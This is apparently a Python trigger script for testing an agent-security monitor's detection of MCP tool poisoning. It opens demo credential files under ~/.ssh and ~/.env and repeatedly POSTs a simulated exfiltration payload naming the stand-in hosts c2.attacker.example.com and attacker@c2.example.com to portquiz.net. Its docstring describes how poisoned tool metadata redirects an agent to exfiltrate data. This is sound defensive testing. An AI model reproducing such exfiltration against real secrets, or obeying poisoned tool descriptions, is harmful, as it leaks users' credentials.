#!/usr/bin/env python3
"""
Trigger MCP tool-poisoning downstream effect detection.

Real threat: MCPTox (Luo et al., 2025) -- malicious instructions
embedded in MCP tool metadata redirect an agent to contact an
attacker-controlled endpoint and exfiltrate data.  Attack success
rate up to 72.8% on capable models.

This script simulates the downstream system-plane effect of a
poisoned tool: the agent process opens credential files (as directed
by the poisoned tool description) and sends HTTP POST requests with
a payload body to an undeclared destination (simulating C2 exfil).

Unlike trigger_cve_token_exfil.py which uses raw TCP streaming,
this trigger uses explicit HTTP POST with JSON-like payloads to
mimic how an MCP tool handler would construct API requests for
data exfiltration.

Detection path:
  flodbadd iForest  ->  session marked "anomalous" (long-lived high-port flow)
  L7 open_files contains sensitive path  ->  token_exfiltration finding
  divergence engine  ->  destination not in behavioral model

Reference: MCPTox benchmark (Luo et al., 2025), arXiv:2508.14925

Cross-platform: macOS, Linux, Windows.
"""

from __future__ import annotations

import argparse
import json
import os
import signal
import socket
import sys
import time
from pathlib import Path

from _common import resolve_agent_type, state_dir_for, file_prefix_for, upper_prefix_for

PID_FILE = "tool_poisoning.pid"
CREATED_MARKER = "tool_poisoning.created"

DEFAULT_TARGET_HOST = "portquiz.net"
DEFAULT_TARGET_PORT = 63172

KEEP_RUNNING = True


def parse_args() -> argparse.Namespace:
    p = argparse.ArgumentParser(
        description="Trigger MCP tool-poisoning effect detection by sending "
                    "HTTP POST exfiltration requests while holding credential "
                    "files open."
    )
    p.add_argument("--agent-type", default=None,
                   help="Agent type: openclaw|cursor|claude_code|claude_desktop (default: openclaw or EDAMAME_AGENT_TYPE)")
    p.add_argument("--target-host", default=DEFAULT_TARGET_HOST)
    p.add_argument("--target-ip", default="",
                   help="Pre-resolved IP; skips DNS if set")
    p.add_argument("--target-port", type=int, default=DEFAULT_TARGET_PORT)
    p.add_argument("--interval", type=float, default=1.0,
                   help="Seconds between POST requests")
    p.add_argument("--duration", type=float, default=0.0,
                   help="Runtime limit in seconds; 0 = until interrupted")
    p.add_argument("--state-dir", type=Path, default=None)
    return p.parse_args()


def handle_signal(signum: int, _frame: object) -> None:
    global KEEP_RUNNING
    _ = signum
    KEEP_RUNNING = False


def ensure_state_dir(d: Path) -> None:
    d.mkdir(parents=True, exist_ok=True)


def record_created(state_dir: Path, path: Path) -> None:
    marker = state_dir / CREATED_MARKER
    existing = set()
    if marker.exists():
        existing = {l.strip() for l in marker.read_text("utf-8").splitlines() if l.strip()}
    existing.add(str(path))
    marker.write_text("\n".join(sorted(existing)) + "\n", encoding="utf-8")


def ensure_demo_sensitive_file(path: Path, content: str, state_dir: Path) -> Path:
    path = path.expanduser()
    path.parent.mkdir(parents=True, exist_ok=True)
    if path.exists():
        return path
    path.write_text(content, encoding="utf-8")
    try:
        path.chmod(0o600)
    except OSError:
        pass
    record_created(state_dir, path)
    return path


def resolve_target(target_ip: str, target_host: str) -> str:
    if target_ip.strip():
        return target_ip.strip()
    return socket.gethostbyname(target_host)


def open_sensitive_files(paths: list[Path]) -> list[object]:
    handles = []
    for p in paths:
        if p.exists():
            h = p.open("rb")
            h.read(1)
            h.seek(0)
            handles.append(h)
    return handles


def build_exfil_payload(request_num: int) -> bytes:
    """Build an HTTP POST with JSON body mimicking MCP tool exfiltration."""
    body = json.dumps({
        "tool": "postmark-mcp",
        "action": "send_email",
        "bcc": "attacker@c2.example.com",
        "data": {
            "conversation_id": f"session-{request_num}",
            "content_hash": f"exfil-{request_num:06d}",
            "timestamp": time.time(),
        },
    })
    request = (
        f"POST /api/v1/collect HTTP/1.1\r\n"
        f"Host: c2.attacker.example.com\r\n"
        f"Content-Type: application/json\r\n"
        f"Content-Length: {len(body)}\r\n"
        f"X-Tool-Origin: poisoned-mcp-descriptor\r\n"
        f"Connection: keep-alive\r\n"
        f"\r\n"
        f"{body}"
    )
    return request.encode()


def main() -> int:
    args = parse_args()
    agent_type = resolve_agent_type(args.agent_type)
    if args.state_dir is None:
        args.state_dir = state_dir_for(agent_type)
    pfx = file_prefix_for(agent_type)
    upfx = upper_prefix_for(agent_type)
    state_dir = args.state_dir
    ensure_state_dir(state_dir)

    ssh_key = ensure_demo_sensitive_file(
        Path(f"~/.ssh/{pfx}_tool_poison_key"),
        f"{upfx}_TOOL_POISONING_EXFIL_KEY\n",
        state_dir,
    )
    env_file = ensure_demo_sensitive_file(
        Path(f"~/.env_{pfx}_tool_poison"),
        f"API_TOKEN={pfx}_tool_poison_token\nSECRET={pfx}_tool_poison_secret\n",
        state_dir,
    )

    open_paths = [ssh_key, env_file]
    psk_path = Path("~/.edamame_psk").expanduser()
    if psk_path.exists():
        open_paths.append(psk_path)

    signal.signal(signal.SIGINT, handle_signal)
    signal.signal(signal.SIGTERM, handle_signal)

    pid_file = state_dir / PID_FILE
    pid_file.write_text(f"{os.getpid()}\n", encoding="utf-8")

    target_ip = resolve_target(args.target_ip, args.target_host)
    handles = open_sensitive_files(open_paths)
    started = time.monotonic()
    duration = max(args.duration, 0.0)
    interval = max(args.interval, 0.2)

    print(f"trigger_tool_poisoning_effects.py active  pid={os.getpid()}")
    for p in open_paths:
        print(f"  open_path={p}")
    print(f"  target={target_ip}:{args.target_port} host={args.target_host}")
    print("  threat=MCPTox tool poisoning (Luo et al., 2025)")
    print("  mode=HTTP POST exfiltration (simulated poisoned tool)")
    print("  detection=token_exfiltration + divergence (undeclared destination)")
    print("  stop_with=Ctrl-C or python3 cleanup.py")
    sys.stdout.flush()

    sock: socket.socket | None = None
    request_num = 0
    try:
        while KEEP_RUNNING:
            if duration > 0 and (time.monotonic() - started) >= duration:
                break

            if sock is None:
                try:
                    sock = socket.create_connection(
                        (target_ip, args.target_port), timeout=10.0
                    )
                    sock.setsockopt(socket.SOL_SOCKET, socket.SO_KEEPALIVE, 1)
                    sock.settimeout(30.0)
                except OSError:
                    time.sleep(min(interval, 1.0))
                    continue

            request_num += 1
            payload = build_exfil_payload(request_num)
            try:
                sock.sendall(payload)
            except OSError:
                try:
                    sock.close()
                except OSError:
                    pass
                sock = None
                time.sleep(min(interval, 0.5))
                continue

            # Drain any echoed data so the keep-alive HTTP stream stays visible.
            try:
                sock.setblocking(False)
                try:
                    sock.recv(65536)
                except (BlockingIOError, OSError):
                    pass
                finally:
                    sock.setblocking(True)
                    sock.settimeout(30.0)
            except OSError:
                pass

            time.sleep(interval)
    finally:
        if sock is not None:
            try:
                sock.close()
            except OSError:
                pass
        for h in handles:
            try:
                h.close()
            except OSError:
                pass
        try:
            pid_file.unlink()
        except FileNotFoundError:
            pass

    return 0


if __name__ == "__main__":
    raise SystemExit(main())
